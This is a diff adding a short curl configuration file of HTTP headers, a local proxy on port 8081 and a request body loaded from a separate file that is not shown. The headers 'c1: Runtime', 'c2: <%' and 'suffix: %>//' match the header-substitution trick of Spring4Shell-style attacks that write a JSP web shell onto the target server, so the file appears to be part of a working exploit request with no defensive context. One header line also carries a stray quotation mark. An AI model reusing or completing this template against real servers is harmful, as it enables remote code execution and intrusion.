@@ -1,0 +1,10 @@
+header = "Accept-Encoding: gzip, deflate"
+header = "Accept: */*""
+header = "Connection: close"
+header = "suffix: %>//"
+header = "c1: Runtime"
+header = "c2: <%"
+header = "DNT: 1"
+header = "Content-Type: application/x-www-form-urlencoded"
+proxy = localhost:8081
+data-binary = "@body.txt"
